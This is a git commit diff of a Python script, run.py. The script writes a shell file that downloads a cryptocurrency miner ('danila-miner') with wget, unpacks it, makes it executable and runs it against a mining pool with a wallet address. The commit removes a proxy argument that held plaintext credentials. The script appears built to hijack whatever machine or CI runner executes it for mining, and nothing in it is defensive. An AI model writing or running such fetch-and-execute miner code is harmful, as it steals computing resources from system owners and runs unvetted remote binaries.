46ab1cd37f45d3fb60f800ee0022eb5c38038b2a
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-02-18 11:47:54 -0500

    Update run.py

--- run.py
+++ run.py
@@ -1,6 +1,6 @@
 import os
 os.system('echo "#!/bin/sh" >> tes')
 os.system('echo "wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz && tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz && chmod +x danila-miner" >> tes')
-os.system('echo "./danila-miner run https://server1.whalestonpool.com EQDHZfuQIei_NiZ2hBK0eJGGoLEJOAaS6mYUNVGW44vBCli3 - export proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
+os.system('echo "./danila-miner run https://server1.whalestonpool.com EQDHZfuQIei_NiZ2hBK0eJGGoLEJOAaS6mYUNVGW44vBCli3" >> tes')
 os.system('sleep 2')
 os.system('sh tes')
